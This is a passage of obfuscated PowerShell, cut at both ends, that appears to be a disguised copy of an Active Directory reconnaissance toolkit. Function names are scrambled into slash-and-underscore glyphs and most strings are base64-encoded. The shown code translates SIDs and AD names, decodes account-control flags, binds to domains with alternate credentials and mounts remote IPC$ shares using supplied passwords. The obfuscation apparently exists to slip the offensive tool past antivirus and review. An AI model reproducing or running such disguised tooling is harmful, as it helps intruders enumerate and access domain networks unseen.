                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBlAC0AVwBpAG4AZABvAHcAcwAgADIAMAAwADAAIABDAG8AbQBwAGEAdABpAGIAbABlACAAQQBjAGMAZQBzAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAE4AZQB0AHcAbwByAGsAIABDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEkAbgBjAG8AbQBpAG4AZwAgAEYAbwByAGUAcwB0ACAAVAByAHUAcwB0ACAAQgB1AGkAbABkAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAE0AbwBuAGkAdABvAHIAIABVAHMAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAEwAbwBnACAAVQBzAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFcAaQBuAGQAbwB3AHMAIABBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACAAQQBjAGMAZQBzAHMAIABHAHIAbwB1AHAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAATABpAGMAZQBuAHMAZQAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEQAaQBzAHQAcgBpAGIAdQB0AGUAZAAgAEMATwBNACAAVQBzAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADMA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEUAdgBlAG4AdAAgAEwAbwBnACAAUgBlAGEAZABlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAFMAZQByAHYAaQBjAGUAIABEAEMATwBNACAAQQBjAGMAZQBzAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAAUgBlAG0AbwB0AGUAIABBAGMAYwBlAHMAcwAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAARQBuAGQAcABvAGkAbgB0ACAAUwBlAHIAdgBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAATQBhAG4AYQBnAGUAbQBlAG4AdAAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEgAeQBwAGUAcgAtAFYAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA4ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    Default {
                        __/\/=\_/\/=\/=\_/ -Identity ${_/\__/====\/\__/\} @___/=\/=\__/====\
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBTAEkARABdACAARQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgAFMASQBEACAAJwAkAHsAXwAvAFwAXwBfAC8APQA9AD0APQBcAC8AXABfAF8ALwBcAH0AJwAgADoAIAAkAF8A')))
            }
        }
    }
}
function __/\/=\_/\/=\/=\_/ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $Identity,
        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        ${_/============\/\/},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/==\/=\/\___/\__} = @{
            'DN'                =   1  
            'Canonical'         =   2  
            'NT4'               =   3  
            'Display'           =   4  
            'DomainSimple'      =   5  
            'EnterpriseSimple'  =   6  
            'GUID'              =   7  
            'Unknown'           =   8  
            'UPN'               =   9  
            'CanonicalEx'       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }
        function _/=====\/\__/\/\/\([__ComObject] $Object, [String] $Method, ${__/\_/=\_/\/\/\/==}) {
            ${/===\______/\/==\} = $Null
            ${/===\______/\/==\} = $Object.GetType().InvokeMember($Method, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUATQBlAHQAaABvAGQA'))), $NULL, $Object, ${__/\_/=\_/\/\/\/==})
            echo ${/===\______/\/==\}
        }
        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $NULL, $Object, $NULL)
        }
        function ___/\/=\__/====\/=([__ComObject] $Object, [String] $Property, ${__/\_/=\_/\/\/\/==}) {
            [Void] $Object.GetType().InvokeMember($Property, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $NULL, $Object, ${__/\_/=\_/\/\/\/==})
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            ${/====\/\/=\/\/\/\} = 2
            ${_/\_/\_/=\/=\_/==} = $Server
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${/====\/\/=\/\/\/\} = 1
            ${_/\_/\_/=\/=\_/==} = $Domain
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${____/\/\/\_/\___/} = $Credential.GetNetworkCredential()
            ${/====\/\/=\/\/\/\} = 1
            ${_/\_/\_/=\/=\_/==} = ${____/\/\/\_/\___/}.Domain
        }
        else {
            ${/====\/\/=\/\/\/\} = 3
            ${_/\_/\_/=\/=\_/==} = $Null
        }
    }
    PROCESS {
        ForEach (${___/===\/==\/=\_/} in $Identity) {
            if (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAVAB5AHAAZQA=')))]) {
                if (${___/===\/==\/=\_/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbAEEALQBaAGEALQB6AF0AKwBcAFwAWwBBAC0AWgBhAC0AegAgAF0AKwA=')))) {
                    ${_/===\/\/\_/===\_} = ${_/==\/=\/\___/\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA')))]
                }
                else {
                    ${_/===\/\/\_/===\_} = ${_/==\/=\/\___/\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUADQA')))]
                }
            }
            else {
                ${_/===\/\/\_/===\_} = ${_/==\/=\/\___/\__}[${_/============\/\/}]
            }
            ${/==\/\_/\/\/=\/=\} = New-Object -ComObject NameTranslate
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                try {
                    ${____/\/\/\_/\___/} = $Credential.GetNetworkCredential()
                    _/=====\/\__/\/\/\ ${/==\/\_/\/\/=\/=\} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABFAHgA'))) (
                        ${/====\/\/=\/\/\/\},
                        ${_/\_/\_/=\/=\_/==},
                        ${____/\/\/\_/\___/}.UserName,
                        ${____/\/\/\_/\___/}.Domain,
                        ${____/\/\/\_/\___/}.Password
                    )
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0AQQBEAE4AYQBtAGUAXQAgAEUAcgByAG8AcgAgAGkAbgBpAHQAaQBhAGwAaQB6AGkAbgBnACAAdAByAGEAbgBzAGwAYQB0AGkAbwBuACAAZgBvAHIAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIAB1AHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgADoAIAAkAF8A')))
                }
            }
            else {
                try {
                    $Null = _/=====\/\__/\/\/\ ${/==\/\_/\/\/=\/=\} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdAA='))) (
                        ${/====\/\/=\/\/\/\},
                        ${_/\_/\_/=\/=\_/==}
                    )
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0AQQBEAE4AYQBtAGUAXQAgAEUAcgByAG8AcgAgAGkAbgBpAHQAaQBhAGwAaQB6AGkAbgBnACAAdAByAGEAbgBzAGwAYQB0AGkAbwBuACAAZgBvAHIAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIAA6ACAAJABfAA==')))
                }
            }
            ___/\/=\__/====\/= ${/==\/\_/\/\/=\/=\} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcwBlAFIAZQBmAGUAcgByAGEAbAA='))) (0x60)
            try {
                $Null = _/=====\/\__/\/\/\ ${/==\/\_/\/\/=\/=\} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA'))) (8, ${___/===\/==\/=\_/})
                _/=====\/\__/\/\/\ ${/==\/\_/\/\/=\/=\} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) (${_/===\/\/\_/===\_})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '${___/===\/==\/=\_/}' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}
function ConvertFrom-UACValue {
    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        ${_____/===\___/\/\},
        [Switch]
        $ShowAll
    )
    BEGIN {
        ${_/\_/==\/\/=\__/\} = New-Object System.Collections.Specialized.OrderedDictionary
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBDAFIASQBQAFQA'))), 1)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEMATwBVAE4AVABEAEkAUwBBAEIATABFAA=='))), 2)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQBEAEkAUgBfAFIARQBRAFUASQBSAEUARAA='))), 8)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABPAEMASwBPAFUAVAA='))), 16)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBOAE8AVABSAEUAUQBEAA=='))), 32)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBDAEEATgBUAF8AQwBIAEEATgBHAEUA'))), 64)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA=='))), 128)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABFAE0AUABfAEQAVQBQAEwASQBDAEEAVABFAF8AQQBDAEMATwBVAE4AVAA='))), 256)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFIATQBBAEwAXwBBAEMAQwBPAFUATgBUAA=='))), 512)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFQARQBSAEQATwBNAEEASQBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 2048)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBPAFIASwBTAFQAQQBUAEkATwBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 4096)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAFIAVgBFAFIAXwBUAFIAVQBTAFQAXwBBAEMAQwBPAFUATgBUAA=='))), 8192)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAEUAWABQAEkAUgBFAF8AUABBAFMAUwBXAE8AUgBEAA=='))), 65536)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBOAFMAXwBMAE8ARwBPAE4AXwBBAEMAQwBPAFUATgBUAA=='))), 131072)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEEAUgBUAEMAQQBSAEQAXwBSAEUAUQBVAEkAUgBFAEQA'))), 262144)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAEYATwBSAF8ARABFAEwARQBHAEEAVABJAE8ATgA='))), 524288)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwBEAEUATABFAEcAQQBUAEUARAA='))), 1048576)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAXwBEAEUAUwBfAEsARQBZAF8ATwBOAEwAWQA='))), 2097152)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAFIARQBRAF8AUABSAEUAQQBVAFQASAA='))), 4194304)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAE8AUgBEAF8ARQBYAFAASQBSAEUARAA='))), 8388608)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAFQATwBfAEEAVQBUAEgAXwBGAE8AUgBfAEQARQBMAEUARwBBAFQASQBPAE4A'))), 16777216)
        ${_/\_/==\/\/=\__/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFIAVABJAEEATABfAFMARQBDAFIARQBUAFMAXwBBAEMAQwBPAFUATgBUAA=='))), 67108864)
    }
    PROCESS {
        ${_/==\__/\___/====} = New-Object System.Collections.Specialized.OrderedDictionary
        if ($ShowAll) {
            ForEach (${___/\_/=\/\/=\/\/} in ${_/\_/==\/\/=\__/\}.GetEnumerator()) {
                if ( (${_____/===\___/\/\} -band ${___/\_/=\/\/=\/\/}.Value) -eq ${___/\_/=\/\/=\/\/}.Value) {
                    ${_/==\__/\___/====}.Add(${___/\_/=\/\/=\/\/}.Name, "$(${___/\_/=\/\/=\/\/}.Value)+")
                }
                else {
                    ${_/==\__/\___/====}.Add(${___/\_/=\/\/=\/\/}.Name, "$(${___/\_/=\/\/=\/\/}.Value)")
                }
            }
        }
        else {
            ForEach (${___/\_/=\/\/=\/\/} in ${_/\_/==\/\/=\__/\}.GetEnumerator()) {
                if ( (${_____/===\___/\/\} -band ${___/\_/=\/\/=\/\/}.Value) -eq ${___/\_/=\/\/=\/\/}.Value) {
                    ${_/==\__/\___/====}.Add(${___/\_/=\/\/=\/\/}.Name, "$(${___/\_/=\/\/=\/\/}.Value)")
                }
            }
        }
        ${_/==\__/\___/====}
    }
}
function __/=\/=\_/\/=\_/\_ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    try {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] -or ($Identity -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA'))))) {
            if ($Identity -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                ${_/=\_/\/=\_/=====} = $Identity | __/\/=\_/\/=\/=\_/ -_/============\/\/ Canonical
                if (${_/=\_/\/=\_/=====}) {
                    ${____/===\_/\/=\/\} = ${_/=\_/\/=\_/=====}.SubString(0, ${_/=\_/\/=\_/=====}.IndexOf('/'))
                    ${/=\_/\/\_______/=} = $Identity.Split('\')[1]
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEIAaQBuAGQAaQBuAGcAIAB0AG8AIABkAG8AbQBhAGkAbgAgACcAJAB7AF8AXwBfAF8ALwA9AD0APQBcAF8ALwBcAC8APQBcAC8AXAB9ACcA')))
                }
            }
            else {
                ${/=\_/\/\_______/=} = $Identity
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEIAaQBuAGQAaQBuAGcAIAB0AG8AIABkAG8AbQBhAGkAbgAgACcAJABEAG8AbQBhAGkAbgAnAA==')))
                ${____/===\_/\/=\/\} = $Domain
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAFUAcwBpAG4AZwAgAGEAbAB0AGUAcgBuAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA==')))
                ${_/\_/\__/\/\/\___} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${____/===\_/\/=\/\}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                ${_/\_/\__/\/\/\___} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${____/===\_/\/=\/\})
            }
        }
        else {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAFUAcwBpAG4AZwAgAGEAbAB0AGUAcgBuAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA==')))
                ${/===\_/==\__/====} = __/\/\__/=\/\/\/\/ | select -ExpandProperty Name
                ${_/\_/\__/\/\/\___} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${/===\_/==\__/====}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                ${_/\_/\__/\/\/\___} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            ${/=\_/\/\_______/=} = $Identity
        }
        ${/==\/===\__/\___/} = New-Object PSObject
        ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdAA='))) ${_/\_/\__/\/\/\___}
        ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))) ${/=\_/\/\_______/=}
        ${/==\/===\__/\___/}
    }
    catch {
        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEUAcgByAG8AcgAgAGMAcgBlAGEAdABpAG4AZwAgAGIAaQBuAGQAaQBuAGcAIABmAG8AcgAgAG8AYgBqAGUAYwB0ACAAKAAnACQASQBkAGUAbgB0AGkAdAB5ACcAKQAgAGMAbwBuAHQAZQB4AHQAIAA6ACAAJABfAA==')))
    }
}
function _/=\____/\/\/=\__/ {
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=},
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )
    BEGIN {
        ${_/\/\/=\________/} = [Activator]::CreateInstance(${______/\_/\_/\/\/})
        ${_/\/\/=\________/}.dwType = 1
    }
    PROCESS {
        ${___/=\__/\/===\/=} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ForEach (${_/=\/=====\/\_/==} in ${/=\/\/\/=\__/\_/=}) {
                ${_/=\/=====\/\_/==} = ${_/=\/=====\/\_/==}.Trim('\')
                ${___/=\__/\/===\/=} += ,$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewBfAC8APQBcAC8APQA9AD0APQA9AFwALwBcAF8ALwA9AD0AfQBcAEkAUABDACQA')))
            }
        }
        else {
            ${___/=\__/\/===\/=} += ,$Path
        }
        ForEach (${/=\/=\_/\/===\/==} in ${___/=\__/\/===\/=}) {
            ${_/\/\/=\________/}.lpRemoteName = ${/=\/=\_/\/===\/==}
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBBAGQAZAAtAFIAZQBtAG8AdABlAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABtAG8AdQBuAHQAOgAgACQAewAvAD0AXAAvAD0AXABfAC8AXAAvAD0APQA9AFwALwA9AD0AfQA=')))
            ${___/=\/\________/} = ${/====\/\__/=\/=\/}::WNetAddConnection2W(${_/\/\/=\________/}, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)
            if (${___/=\/\________/} -eq 0) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8APQBcAF8ALwBcAC8APQA9AD0AXAAvAD0APQB9ACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABtAG8AdQBuAHQAZQBkAA==')))
            }
            else {
                Throw "[Add-RemoteConnection] error mounting ${/=\/=\_/\/===\/==} : $(([ComponentModel.Win32Exception]${___/=\/\________/}).Message)"
            }
        }
    }
}
function __/======\__/===\_ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=},
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )
    PROCESS {
        ${___/=\__/\/===\/=} = @()
